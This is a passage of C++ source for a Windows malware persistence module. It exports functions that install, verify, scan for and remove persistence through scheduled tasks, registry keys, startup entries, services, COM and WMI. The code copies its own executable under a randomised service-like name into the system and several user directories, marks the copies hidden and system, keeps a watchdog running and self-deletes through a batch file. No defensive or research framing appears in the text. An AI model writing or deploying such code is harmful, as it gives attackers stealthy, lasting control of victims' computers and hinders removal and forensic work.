        Logger::LogWithContext(Logger::LOG_INFO, "FullVerification", "Starting comprehensive persistence scan");
        
        bool anyFound = false;
        
        // Check all methods regardless of what was supposedly installed
        if (VerifyScheduledTask()) {
            anyFound = true;
            Logger::LogWithContext(Logger::LOG_INFO, "FullVerification", "Found active scheduled tasks");
        }
        
        if (VerifyRegistryEntry()) {
            anyFound = true;
            Logger::LogWithContext(Logger::LOG_INFO, "FullVerification", "Found active registry entries");
        }
        
        if (VerifyStartupEntry()) {
            anyFound = true;
            Logger::LogWithContext(Logger::LOG_INFO, "FullVerification", "Found active startup entries");
        }
        
        if (isAdmin) {
            if (VerifyServiceEntry()) {
                anyFound = true;
                Logger::LogWithContext(Logger::LOG_INFO, "FullVerification", "Found active services");
            }
            
            if (VerifyCOMPersistence()) {
                anyFound = true;
                Logger::LogWithContext(Logger::LOG_INFO, "FullVerification", "Found active COM entries");
            }
            
            if (VerifyAdvancedRegistry()) {
                anyFound = true;
                Logger::LogWithContext(Logger::LOG_INFO, "FullVerification", "Found advanced registry entries");
            }
        }
        
        // Check file presence
        int filesFound = 0;
        std::vector<std::wstring> allPossiblePaths = {targetPath, userTargetPath};
        allPossiblePaths.insert(allPossiblePaths.end(), fallbackPaths.begin(), fallbackPaths.end());
        allPossiblePaths.insert(allPossiblePaths.end(), successfulCopies.begin(), successfulCopies.end());
        
        for (const auto& filePath : allPossiblePaths) {
            if (GetFileAttributesW(filePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
                filesFound++;
                Logger::LogWithContext(Logger::LOG_INFO, "FullVerification", 
                                     "Found file: " + std::string(filePath.begin(), filePath.end()));
            }
        }
        
        if (filesFound > 0) {
            anyFound = true;
        }
        
        // Check watchdog
        if (WatchdogManager::IsWatchdogRunning()) {
            anyFound = true;
            Logger::LogWithContext(Logger::LOG_INFO, "FullVerification", "Watchdog is active");
        }
        
        Logger::LogWithContext(Logger::LOG_INFO, "FullVerification", 
                             "Comprehensive scan complete. Persistence found: " + std::string(anyFound ? "YES" : "NO"));
        
        return anyFound;
    }
    
    bool SelfDelete() {
        Logger::LogWithContext(Logger::LOG_INFO, "Cleanup", "Performing self-delete operation");
        
        // Stop watchdog first
        WatchdogManager::StopWatchdog();
        
        // Remove all persistence
        RemoveAllPersistence();
        
        // Schedule file deletion after process exit
        std::wstring batchPath = CreateSelfDeleteBatch();
        if (!batchPath.empty()) {
            STARTUPINFOW si = {sizeof(si)};
            PROCESS_INFORMATION pi;
            
            if (CreateProcessW(NULL, const_cast<LPWSTR>(batchPath.c_str()), NULL, NULL, FALSE,
                              CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                return true;
            }
        }
        
        return false;
    }

private:
    void GenerateTargetPaths() {
        WCHAR systemDir[MAX_PATH];
        WCHAR userDir[MAX_PATH];
        WCHAR localAppData[MAX_PATH];
        WCHAR tempDir[MAX_PATH];
        
        GetSystemDirectoryW(systemDir, MAX_PATH);
        SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, userDir);
        SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
        GetTempPathW(MAX_PATH, tempDir);
        
        std::wstring filename = AdvancedObfuscator::GetRandomServiceName() + L".exe";
        
        // Primary target path (system directory for admin)
        targetPath = std::wstring(systemDir) + L"\\" + filename;
        
        // Multiple user-level fallback paths
        userTargetPath = std::wstring(userDir) + L"\\Microsoft\\Windows\\" + filename;
        fallbackPaths.push_back(std::wstring(localAppData) + L"\\Microsoft\\" + filename);
        fallbackPaths.push_back(std::wstring(userDir) + L"\\" + filename);
        fallbackPaths.push_back(std::wstring(tempDir) + filename);
        
        // Additional stealth paths
        fallbackPaths.push_back(std::wstring(userDir) + L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\..\\" + filename);
        fallbackPaths.push_back(std::wstring(localAppData) + L"\\Temp\\" + filename);
    }
    
    bool CopyToTargetLocations() {
        bool success = false;
        
        // Verify source file integrity first
        if (!VerifyFileIntegrity(executablePath)) {
            Logger::LogWithContext(Logger::LOG_ERROR, "FileCopy", "Source file integrity check failed");
            return false;
        }
        
        // Try system directory first (admin required)
        if (isAdmin) {
            if (CopyFileWithVerification(executablePath, targetPath)) {
                SetFileAttributesW(targetPath.c_str(), 
                    FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
                successfulCopies.push_back(targetPath);
                success = true;
                Logger::LogWithContext(Logger::LOG_INFO, "FileCopy", 
                           "Copied to system directory: " + std::string(targetPath.begin(), targetPath.end()));
            } else {
                Logger::LogWithContext(Logger::LOG_WARNING, "FileCopy", "Failed to copy to system directory, trying fallbacks", GetLastError());
            }
        }
        
        // Always try primary user directory
        if (CreateDirectoryRecursive(userTargetPath)) {
            if (CopyFileWithVerification(executablePath, userTargetPath)) {
                SetFileAttributesW(userTargetPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
                successfulCopies.push_back(userTargetPath);
                success = true;
                Logger::LogWithContext(Logger::LOG_INFO, "FileCopy", 
                           "Copied to primary user directory: " + std::string(userTargetPath.begin(), userTargetPath.end()));
            }
        }
        
        // Try all fallback paths
        for (const auto& fallbackPath : fallbackPaths) {
            if (CreateDirectoryRecursive(fallbackPath)) {
                if (CopyFileWithVerification(executablePath, fallbackPath)) {
                    SetFileAttributesW(fallbackPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
                    successfulCopies.push_back(fallbackPath);
                    success = true;
                    Logger::LogWithContext(Logger::LOG_INFO, "FileCopy", 
                               "Copied to fallback path: " + std::string(fallbackPath.begin(), fallbackPath.end()));
                }
            }
        }
        
        if (!success) {
            Logger::LogWithContext(Logger::LOG_ERROR, "FileCopy", "Failed to copy to any target location");
        } else {
            Logger::LogWithContext(Logger::LOG_INFO, "FileCopy", 
                                 "Successfully copied to " + std::to_string(successfulCopies.size()) + " locations");
        }
        
        return success;
    }
    
    // Forward declarations for other methods
    bool CreateEnhancedScheduledTask();
    bool CreateEnhancedRegistryEntry();
    bool CreateEnhancedStartupEntry();
    bool InstallCOMPersistence();
    bool InstallServicePersistence();
    bool InstallAdvancedRegistryMethods();
    bool InstallWMIPersistence();
    
    void RemoveAllPersistence();
    bool ShouldSelfDelete();
    void PerformCleanup();
    std::wstring CreateSelfDeleteBatch();
    std::wstring GenerateGUID();
};

// Export functions
extern "C" {
    bool InstallAdvancedPersistence() {
        #ifdef _DEBUG
        Logger::SetLevel(Logger::LOG_DEBUG);
        #else
        Logger::SetLevel(Logger::LOG_INFO);
        #endif
        
        try {
            AdvancedPersistence persistence;
            bool success = persistence.InstallPersistence();
            
            Logger::LogWithContext(Logger::LOG_INFO, "Export", 
                                 success ? "Advanced persistence installed" : "Persistence installation failed");
            return success;
            
        } catch (...) {
            Logger::LogWithContext(Logger::LOG_ERROR, "Export", "Exception during persistence installation");
            return false;
        }
    }
    
    bool VerifyAdvancedPersistence() {
        try {
            AdvancedPersistence persistence;
            bool result = persistence.VerifyPersistence();
            
            Logger::LogWithContext(Logger::LOG_INFO, "Export", 
                                 "Persistence verification result: " + std::string(result ? "VALID" : "INVALID"));
            return result;
            
        } catch (...) {
            Logger::LogWithContext(Logger::LOG_ERROR, "Export", "Exception during persistence verification");
            return false;
        }
    }
    
    bool ScanForPersistence() {
        try {
            AdvancedPersistence persistence;
            bool found = persistence.VerifyAllPersistenceMethods();
            
            Logger::LogWithContext(Logger::LOG_INFO, "Export", 
                                 "Comprehensive persistence scan result: " + std::string(found ? "FOUND" : "NOT_FOUND"));
            return found;
            
        } catch (...) {
            Logger::LogWithContext(Logger::LOG_ERROR, "Export", "Exception during persistence scan");
            return false;
        }
    }
    
    bool CleanupPersistence() {
        try {
            AdvancedPersistence persistence;
            bool result = persistence.SelfDelete();
            
            Logger::LogWithContext(Logger::LOG_INFO, "Export", 
                                 "Cleanup result: " + std::string(result ? "SUCCESS" : "FAILED"));
            return result;
            
        } catch (...) {
            Logger::LogWithContext(Logger::LOG_ERROR, "Export", "Exception during cleanup");
            return false;
        }
    }
    
    // New function to get detailed verification status
    bool GetPersistenceStatus(char* statusBuffer, int bufferSize) {
        if (!statusBuffer || bufferSize < 1) return false;
        
        try {
            AdvancedPersistence persistence;
            
            // Perform comprehensive verification
            bool hasScheduledTasks = persistence.VerifyScheduledTask();
            bool hasRegistryEntries = persistence.VerifyRegistryEntry();
            bool hasStartupEntries = persistence.VerifyStartupEntry();
            bool hasServices = persistence.VerifyServiceEntry();
            bool hasCOMEntries = persistence.VerifyCOMPersistence();
            bool hasAdvancedRegistry = persistence.VerifyAdvancedRegistry();
            bool hasWatchdog = WatchdogManager::IsWatchdogRunning();
            
            // Format status string
            std::string status = "Tasks:" + std::string(hasScheduledTasks ? "1" : "0") +
                               ",Registry:" + std::string(hasRegistryEntries ? "1" : "0") +
                               ",Startup:" + std::string(hasStartupEntries ? "1" : "0") +
                               ",Services:" + std::string(hasServices ? "1" : "0") +
                               ",COM:" + std::string(hasCOMEntries ? "1" : "0") +
                               ",AdvReg:" + std::string(hasAdvancedRegistry ? "1" : "0") +
                               ",Watchdog:" + std::string(hasWatchdog ? "1" : "0");
            
            // Copy to buffer
            int copyLen = (int)status.length() < (bufferSize - 1) ? (int)status.length() : (bufferSize - 1);
            memcpy(statusBuffer, status.c_str(), copyLen);
            statusBuffer[copyLen] = '\0';
            
            return true;
            
        } catch (...) {
            if (bufferSize > 0) statusBuffer[0] = '\0';
            return false;
        }
    }
}